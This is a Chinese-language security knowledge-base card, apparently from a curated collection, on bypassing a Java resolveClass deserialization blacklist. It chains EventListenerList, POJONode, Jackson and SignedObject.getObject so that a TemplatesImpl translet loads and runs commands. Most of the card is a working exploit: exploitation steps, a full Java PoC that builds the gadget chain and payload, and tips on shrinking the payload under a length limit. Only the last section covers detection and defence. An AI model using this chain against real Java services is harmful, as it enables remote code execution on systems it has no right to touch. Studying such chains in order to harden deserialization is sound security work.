---
id: web-java-deserialization-jackson-signedobject-getobject-short-chain
title: Jackson + SignedObject 二次反序列化绕过 resolveClass 黑名单（TemplatesImpl 短链）
type: scenario
domain: web
path: web/java/deserialization/jackson
technique: jackson-signedobject-getobject-resolveclass-bypass
tags:
- java
- deserialization
- jackson
- signedobject
- pojonode
- eventlistenerlist
- resolveclass
- templatesimpl
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V22
  verified_at: '2026-11-05T02:40:52+08:00'
  notes: 已对照原文与图01-14核对：SignedObject 构造/getObject 内层普通 ObjectInputStream；POJONode.toString→nodeToString→writeValueAsString 调 getter；resolveClass 黑名单前缀为 com.sun.org.apache.xalan.internal.xsltc.trax、javax.management、org.springframework.aop.aspectj；短链 SignedObject(TemplatesImpl)→Jackson getOutputProperties，实测删除/a后取flag。原文未给受影响版本，未设置 affected_versions。未复现PoC。
url: /docs/web/java/deserialization/jackson/web-java-deserialization-jackson-signedobject-getobject-short-chain/
draft: false
kb_aliases:
- Jackson SignedObject 二次反序列化
- POJONode getObject 绕过
- resolveClass 黑名单绕过
- EventListenerList POJONode SignedObject
- TemplatesImpl 短链
---

## 一句话结论

当目标用自定义 `resolveClass` 黑名单拦截 gadget 类时，可用 `EventListenerList → POJONode.toString → ObjectMapper.writeValueAsString → SignedObject.getObject` 触发内层无过滤反序列化；让 `getObject` 直接返回被黑名单的 `TemplatesImpl`，Jackson 继续序列化它并调用 `getOutputProperties`，即可用更短的链完成 RCE。

## 原理

- 目标常通过继承 `ObjectInputStream` 并重写 `resolveClass(ObjectStreamClass)` 做类名前缀黑名单。该黑名单只作用于当前的 `MyObjectInputStream` 实例。
- `java.security.SignedObject` 构造时把任意 `Serializable` 对象序列化进 `content`；`getObject()` 内部执行 `new ObjectInputStream(new ByteArrayInputStream(content)).readObject()`。这是**普通** `ObjectInputStream`，不继承目标的 `MyObjectInputStream`，因此内层类不受外层 `resolveClass` 黑名单约束。
- 触发点：Jackson 的 `ObjectMapper.writeValueAsString(bean)` 会按 getter 序列化 bean；`SignedObject.getObject()` 是合法 getter，因此 Jackson 会调用它，返回内层反序列化得到的对象。
- Jackson 的 `POJONode.toString()` 走 `BaseJsonNode.toString() → InternalNodeMapper.nodeToString() → ObjectMapper.writeValueAsString()`，把任意对象交给 Jackson 序列化，从而调用其 getter。
- `POJONode.toString()` 本身可由 `EventListenerList.readObject → UndoManager.toString → Vector.toString` 触发（JDK 高版本仍可用）。
- 短链技巧：内层 payload 不放完整 gadget，而是直接放 `TemplatesImpl`（其包名前缀 `com.sun.org.apache.xalan.internal.xsltc.trax` 在外层黑名单里，但内层普通 OIS 看不到）。`getObject()` 返回已加载的 `TemplatesImpl` 实例后，Jackson 继续把它当 bean 序列化，调用 `getOutputProperties()` → `newTransformer()` → `defineTransletClasses()` → 加载 `_bytecodes` 中的 translet 并执行。这样无需第二层 `EventListenerList`，payload 显著缩短。
- 生成端必须去掉 `com.fasterxml.jackson.databind.node.BaseJsonNode.writeReplace`，否则序列化 POJONode 时会被替换成其他节点，目标端无法还原成 POJONode（只改生成端 JVM，不影响目标）。

## 触发条件

- 存在 Java 原生反序列化入口（`ObjectInputStream.readObject`）。
- 目标只用 `resolveClass` 黑名单，且未拦截 `java.security.SignedObject`、`EventListenerList`、`UndoManager`、`POJONode` 等载体类。
- classpath 含 jackson-databind；目标 JDK 支持 `TemplatesImpl`（JDK8 最直接）。
- 未启用 JEP 415 `SerialFilterFactory` 合并全局过滤器（否则内层新 OIS 可能继承策略）。
- 可用 `Unsafe` 或反射构造 `TemplatesImpl` 并设置 `_bytecodes`、`_name`。

## 利用步骤

1. 用 Javassist 生成继承 `AbstractTranslet` 的恶意类，在构造器/静态块中执行命令，得到字节码。
2. `Unsafe.allocateInstance(TemplatesImpl.class)` 绕过构造器，设置 `_bytecodes={evilBytes}`、`_name`；Unsafe 使 `_transletIndex=0`、`_tfactory=null`，文章环境可直接工作。
3. 生成端删除 `BaseJsonNode.writeReplace` 并重新加载该类。
4. 用 DSA 密钥构造 `SignedObject` 包裹 `TemplatesImpl`。
5. 构造 `POJONode(signedObject)`，放入 `UndoManager.edits`（Vector），再把 `EventListenerList.listenerList` 设为 `{Map.class, undoManager}`。
6. 序列化 `EventListenerList`；若入口有长度限制或使用 `InflaterInputStream`，先压缩（见 payload 长度压缩卡片）。
7. 发送 payload：外层 `EventListenerList` 触发 `POJONode.toString` → Jackson → `SignedObject.getObject` → 内层 `TemplatesImpl`；Jackson 调 `getOutputProperties` 执行命令。

## PoC

```java
ClassPool pool = ClassPool.getDefault();
CtClass evil = pool.makeClass("a");
evil.setSuperclass(pool.get(AbstractTranslet.class.getName()));
CtConstructor ctor = new CtConstructor(new CtClass[]{}, evil);
ctor.setBody("Runtime.getRuntime().exec(\"calc\");");
evil.addConstructor(ctor);
byte[] evilBytes = evil.toBytecode();

TemplatesImpl templates = (TemplatesImpl) createObjWithoutConstructor(TemplatesImpl.class);
setValue(templates, "_bytecodes", new byte[][]{evilBytes});
setValue(templates, "_name", "a");

// 生成端去掉 writeReplace，保证 POJONode 可被序列化
CtClass jsonNode = pool.get("com.fasterxml.jackson.databind.node.BaseJsonNode");
jsonNode.removeMethod(jsonNode.getDeclaredMethod("writeReplace"));
jsonNode.toClass(Thread.currentThread().getContextClassLoader(), null);

KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
kpg.initialize(1024);
KeyPair kp = kpg.generateKeyPair();
SignedObject so = new SignedObject(
    templates, kp.getPrivate(), Signature.getInstance("DSA"));

POJONode node = new POJONode(so);
EventListenerList list = (EventListenerList) createObjWithoutConstructor(EventListenerList.class);
UndoManager um = new UndoManager();
((Vector) getFieldValue(um, "edits")).add(node);
setFieldValue(list, "listenerList", new Object[]{Map.class, um});

// 序列化 list；目标入口若用 InflaterInputStream，则 Deflate 压缩后 Base64
```

调用链：

```text
EventListenerList.readObject
  -> UndoManager.toString -> Vector.toString
    -> POJONode.toString -> BaseJsonNode.toString -> InternalNodeMapper.nodeToString
      -> ObjectMapper.writeValueAsString
        -> SignedObject.getObject()                 // getter，普通 ObjectInputStream
          -> 内层 TemplatesImpl（绕过 resolveClass 黑名单）
        -> Jackson 继续序列化 TemplatesImpl
          -> TemplatesImpl.getOutputProperties -> newTransformer -> defineTransletClasses -> exec
```

变体（内层放完整 gadget）则形成两层 `EventListenerList → POJONode → ...` 的链，payload 更长；文章最终采用上述短链，在 1282 字符限制下压到 1272。

## 变体与关联

- 变体：`SignedObject.getObject` 的调用可由 `BeanComparator("object")`、`InvokerTransformer` 等其他 getter 链触发；`POJONode` 也可替换为其他会触发 Jackson 序列化的 toString 载体。
- 变体：内层放被黑名单拦截的任意类（如 `javax.management.BadAttributeValueExpException`、Spring AOP 类）再配合完整反序列化链。
- 关联：[[web-java-deserialization-jdk-signedobject-nested-stream-filter-bypass]]（SignedObject 嵌套流绕过 JEP290 的通用原理）、[[web-java-deserialization-jackson-pojonode-spring-aop-templatesimpl-jdk17]]（POJONode getter 链的 JDK17 变体）、[[web-java-deserialization-payload-length-compression]]。
- 边界：目标启用 JEP 415 `setSerialFilterFactory` 合并全局过滤器、或 SignedObject/EventListenerList/POJONode 被白名单拒绝时，链不成立。

## 检测与防御

- 不要只用 `resolveClass` 黑名单；改用类允许列表，并在每个新建 `ObjectInputStream` 上强制过滤。
- 注册 `ObjectInputFilter.Config.setSerialFilterFactory((cur, req) -> ObjectInputFilter.merge(global, req))`，让嵌套流继承全局策略；白名单不要放行 `java.security.SignedObject`。
- 检测序列化流中出现 `java.security.SignedObject` 且 `content` 内含第二段 `AC ED 00 05`；同时监控 `EventListenerList`、`UndoManager`、`POJONode`、`TemplatesImpl` 组合。
- 检测 Jackson 在反序列化阶段调用 `getObject`/`getOutputProperties`，以及动态定义 `AbstractTranslet` 子类。
- 移除不必要的 Xalan/TemplatesImpl 可达性，限制 `sun.misc.Unsafe` 与动态类加载。
